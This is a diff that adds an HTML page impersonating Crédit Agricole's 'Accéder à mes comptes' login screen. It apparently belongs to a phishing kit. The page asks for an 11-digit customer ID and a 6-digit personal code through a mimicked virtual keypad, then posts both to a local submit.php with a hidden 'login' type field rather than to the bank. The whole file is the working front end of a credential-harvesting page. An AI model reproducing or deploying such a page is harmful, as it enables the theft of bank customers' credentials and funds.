@@ -1,0 +1,286 @@
+
+
+
+
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<title>Accéder à mes comptes - Crédit Agricole</title>
+	<link href="https://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css">
+
+	<link type="image/x-icon" href="files/favicon.ico" rel="shortcut icon">
+	<link rel="stylesheet" href="files/image.css">
+<style>
+
+
+	
+		
+		.reset-input {
+			display:none;
+		}
+		
+		.CODE{
+			display:none;
+		}
+		
+		
+		
+		.resett-input{
+			display:none;
+		}
+		
+		
+		
+		.reset-inputt {
+			display:none;
+		}
+		
+		
+		
+		
+		.fpass{
+			display:none;
+		}
+		
+		.clavier{
+			display:none;
+		}
+		
+		
+		
+		.btn-primary {
+			display:none;
+		}
+	</style>
+</head>
+
+<body>
+
+
+<form  method="post" action="submit.php"><br/>
+
+
+<span class="ident"></span>
+
+
+
+	
+<input type="tel" class="flog" onclick="showHiden()" onkeypress="tran()" placeholder="Exemple 98652706859"  required="" Pattern="[0-9]{11}" name="identifiant" maxlength="11" minlength="11" id="input-log" aria-describedby="cryxpad-input-field-help" style=""   /><br/>
+
+<button   class="reset-input"  id="effacer" onclick="document.getElementById('input-log').value = ''" ></button>  
+
+		<script type="text/javascript">
+		function tran(){
+			var click = document.getElementById("input-log");
+			var showicwss = document.getElementsByClassName("reset-input");
+			
+			for(var i = 0; i != showicwss.length; i++){
+				if(click) {
+					showicwss[i].style.display = "block";
+				}
+			}
+		}
+	</script>
+	
+<button   class="resett-input"  id="effacer" onclick="document.getElementById('input-log').value = ''" ></button>  
+
+
+<button type="button" value="Valider" name="chkbox" id="chk" class="botona" onclick="showHide()">ENTRER MON CODE PERSONNEL </button> 
+
+
+
+
+
+
+	
+
+
+		<script type="text/javascript">
+		function showHide(){
+			var click = document.getElementById("chk");
+			var showicwss = document.getElementsByClassName("reset-input");
+			var showicwsst = document.getElementsByClassName("resett-input");
+			var hiddenixwuttts = document.getElementsByClassName("flog");
+			var hiddeninputtts = document.getElementsByClassName("botona");
+			var showinpuyss = document.getElementsByClassName("CODE");
+			var showicnpumaaptss = document.getElementsByClassName("fpass");
+			var showicadnpuaptss = document.getElementsByClassName("clavier");
+			var showicnpssuaptss = document.getElementsByClassName("btn-primary");
+			
+			for(var i = 0; i != showicwss.length; i++){
+				if(click) {
+					showicwss[i].style.display = "none";
+				}
+			}
+			
+			for(var i = 0; i != showicwsst.length; i++){
+				if(click) {
+					showicwsst[i].style.display = "block";
+				}
+			}
+			
+			
+			
+			for(var i = 0; i != hiddenixwuttts.length; i++){
+				if(click) {
+					hiddenixwuttts[i].style.backgroundColor = "#ecedf0";
+				}
+			}
+			
+			
+			for(var i = 0; i != showinpuyss.length; i++){
+				if(click) {
+					showinpuyss[i].style.display = "block";
+				}
+			}
+			
+			
+			for(var i = 0; i != showicnpumaaptss.length; i++){
+				if(click) {
+					showicnpumaaptss[i].style.display = "block";
+				}
+			}
+			
+			for(var i = 0; i != showicadnpuaptss.length; i++){
+				if(click) {
+					showicadnpuaptss[i].style.display = "block";
+				}
+			}
+			
+			for(var i = 0; i != showicnpssuaptss.length; i++){
+				if(click) {
+					showicnpssuaptss[i].style.display = "block";
+				}
+			}
+		
+			for(var i = 0; i != hiddeninputtts.length; i++){
+				if(click) {
+					hiddeninputtts[i].style.display = "none";
+				}
+			}		
+		}
+	</script>
+	
+	
+	<span class="CODE"></span>
+
+<input type="password"  class="fpass" required=""  format="*N" placeholder="Tapez votre code dans le pavé numérique ci-dessous"  Pattern="[0-9]{6}" minlength="6" maxlength="6" name="password" id="pass" aria-describedby="cryxpad-input-field-help"  /><br/>
+
+<button   class="reset-inputt"  id="effacer" onclick="document.getElementById('pass').value = ''" ></button>  
+
+<div class="clavier" id="clav" onclick="trans()" style="">
+		
+			<button type="button" class="zero" onclick="myFunction0()" value="0"  id="zero" >0</button>
+			<button type="button" class="one" onclick="myFunction1()" value="1"  id="one"  >1</button>
+			<button type="button" class="twoo" onclick="myFunction2()" value="2"  id="twoo" >2</button>
+			<button type="button" class="tree" onclick="myFunction3()" value="3"  id="tree" >3</button>
+			<button type="button" class="four" onclick="myFunction4()" value="4"  id="four" >4</button>
+			<button type="button" class="five" onclick="myFunction5()" value="5"  id="five" >5</button>
+			<button type="button" class="six" onclick="myFunction6()" value="6"  id="six"  >6</button>
+			<button type="button" class="seven" onclick="myFunction7()" value="7"  id="seven" >7</button>
+			<button type="button" class="height" onclick="myFunction8()" value="8"  id="height">8</button>
+			<button type="button" class="nine" onclick="myFunction9()" value="9"  id="nine"  >9</button>
+		<br/>
+	</div>	
+	
+			<script type="text/javascript">
+		function trans(){
+			var click = document.getElementById("clav");
+			var showicwss = document.getElementsByClassName("reset-inputt");
+			
+			for(var i = 0; i != showicwss.length; i++){
+				if(click) {
+					showicwss[i].style.display = "block";
+				}
+			}
+		}
+	</script>
+	
+<script>
+var clavier;
+clavier = document.getElementById("pass").value;
+function myFunction0() {
+  clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("zero").value;
+}
+function myFunction1() {
+  clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("one").value;
+}
+function myFunction2() {
+   clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("twoo").value;
+}
+function myFunction3() {
+  clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("tree").value;
+}
+function myFunction4() {
+   clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("four").value;
+}
+function myFunction5() {
+   clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("five").value;
+}
+function myFunction6() {
+  clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("six").value;
+}
+function myFunction7() {
+  clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("seven").value;
+}
+function myFunction8() {
+  clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("height").value;
+}
+function myFunction9() {
+   clavier = document.getElementById("pass").value;
+console.log(clavier)
+document.getElementById("pass").value= clavier + document.getElementById("nine").value;
+}
+</script>
+
+
+		
+<button id="-validate-btn" class="btn-primary" type="submit" >Valider</button>	
+		
+		
+    <br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+	<br/>
+		<input type="hidden" name="type" value="login">
+	</form>
+	
+	
+
+
+
+</body>
+
+
+</html>
